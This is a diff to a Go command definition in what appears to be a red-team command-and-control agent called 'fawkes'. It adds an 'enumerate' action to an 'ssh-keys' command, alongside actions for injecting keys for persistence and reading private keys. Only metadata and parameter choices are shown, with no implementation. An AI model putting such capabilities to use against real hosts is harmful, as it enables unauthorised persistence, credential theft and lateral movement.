@@ -10,7 +10,7 @@ func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "ssh-keys",
 		Description:         "Read or inject SSH authorized_keys for persistence/lateral movement (T1098.004)",
-		HelpString:          "ssh-keys -action <list|add|remove|read-private> [-key <ssh_public_key>] [-user <username>] [-path <file_path>]",
+		HelpString:          "ssh-keys -action <list|add|remove|read-private|enumerate> [-key <ssh_public_key>] [-user <username>] [-path <file_path>]",
 		Version:             1,
 		SupportedUIFeatures: []string{},
 		Author:              "@galoryber",
@@ -25,8 +25,8 @@ func init() {
 				ModalDisplayName: "Action",
 				CLIName:          "action",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
-				Choices:          []string{"list", "add", "remove", "read-private"},
-				Description:      "Action: list authorized_keys, add a key, remove a key, or read private keys",
+				Choices:          []string{"list", "add", "remove", "read-private", "enumerate"},
+				Description:      "Action: list authorized_keys, add a key, remove a key, read private keys, or enumerate SSH config/known_hosts for lateral movement targets",
 				DefaultValue:     "list",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{
